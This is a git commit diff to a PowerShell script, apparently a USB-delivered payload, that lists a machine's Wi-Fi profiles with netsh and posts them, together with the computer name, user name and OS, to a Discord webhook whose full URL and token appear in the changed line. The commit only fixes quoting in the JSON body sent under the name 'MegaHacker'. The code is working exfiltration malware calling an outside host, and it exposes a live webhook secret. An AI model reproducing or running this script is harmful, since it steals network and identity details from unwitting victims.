4dca9548e77fb4b990550e2865c24eb002146bdd
Àngel <aparra1970@gmail.com>
2023-11-09 20:47:43 +0100

    Update trec-pl.ps1

--- trec-pl.ps1
+++ trec-pl.ps1
@@ -11,4 +11,4 @@ netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s)
     $wlan  = $_.Matches.Value;
     $nw =$nw+"      "+ [string]$wlan +" => "+  [string]$env:username +"\r\n";
   }
-Invoke-RestMethod -ContentType 'Application/Json' -Uri "https://discordapp.com/api/webhooks/1169912156163153920/O5--I6RugQVwUl00NVZ6LkGh-Ql-S-tSwQNVw6DefPe2Xs0ksCa3iXlmLQcrAU6Sdpl_" -Method Post -Body ('{"username": "MegaHacker - "'+$env:USBNAME +'"","avatar_url": "https://cdn.memegenerator.es/imagenes/memes/full/31/50/31505790.jpg","content": "'+$nw+'\r\n**Dades:**\r\n     Computer name: '+ $env:COMPUTERNAME +'\r\n     User name: '+ $env:USERNAME +'\r\n     OS: '+ $env:OS +'"}');
+Invoke-RestMethod -ContentType 'Application/Json' -Uri "https://discordapp.com/api/webhooks/1169912156163153920/O5--I6RugQVwUl00NVZ6LkGh-Ql-S-tSwQNVw6DefPe2Xs0ksCa3iXlmLQcrAU6Sdpl_" -Method Post -Body ('{"username": "MegaHacker - $env:USBNAME","avatar_url": "https://cdn.memegenerator.es/imagenes/memes/full/31/50/31505790.jpg","content": "'+$nw+'\r\n**Dades:**\r\n     Computer name: '+ $env:COMPUTERNAME +'\r\n     User name: '+ $env:USERNAME +'\r\n     OS: '+ $env:OS +'"}');
